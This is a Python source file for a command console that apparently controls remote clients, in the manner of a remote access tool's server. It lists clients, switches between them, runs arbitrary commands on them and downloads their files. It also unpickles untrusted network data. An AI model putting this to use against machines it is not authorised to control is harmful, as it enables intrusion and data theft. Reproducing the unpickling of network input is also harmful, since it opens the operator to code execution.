import os
import cmd
import pickle

from typing import List
from utils import print_files, prompet, console


CHUNK_SIZE: int = 1096


class Cmdl(cmd.Cmd):
    def __init__(self, server_self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.server = server_self
        self.files_complete: List[str] = []
        self.client_path: str = "~"

    def do_clients(self, arg: str) -> None:
        index: int = 0
        for i, addr in self.server.clients:
            console.print(f"[{index}] {addr[0]}:{addr[1]}")
            index += 1

    def do_move(self, arg: str) -> None:
        self.server.active_client_index = int(arg)
        self.do_cd(".")

    def do_ls(self, arg: str) -> None:
        self.server.send(f"ls {arg}".encode("utf-8"))
        unpickled_data: dict = self.server.recv_pickled_data()
        if unpickled_data["status"]:
            print_files(unpickled_data["content"])
        else:
            print(unpickled_data["error"])

    def do_cd(self, arg: str) -> None:
        self.server.send(f"cd {arg}".encode("utf-8"))
        rc: dict = self.server.recv_pickled_data()
        if rc["status"]:
            self.files_complete = rc["content"][0]
            self.client_path = rc["content"][1]
        else:
            print(rc["error"])

    def default(self, line: str) -> None:
        self.server.send(line.encode("utf-8"))
        print(self.server.recv())

    def postcmd(self, stop: bool, line: str) -> bool:
        self.server.refresh_cmd()
        return super().postcmd(stop, line)

    def do_download(self, path) -> None:
        self.server.send(f"download {path}".encode('utf-8'))
        rc: dict = self.server.recv_pickled_data()
        if rc["status"]:
            size: int = rc["content"]
            print("SiZe:", size)
            r = size
            with open(os.path.basename(path), "wb") as f:
                while r and r > 0:
                    gets: int = CHUNK_SIZE if r >= CHUNK_SIZE else r
                    print("\x1b[33mrecive:\x1b[0m", gets)
                    data: bytes = self.server.active_client.recv(gets)
                    # print(data)
                    f.write(data)
                    r -= gets
            print("# DONE")
        else:
            print(rc["error"])
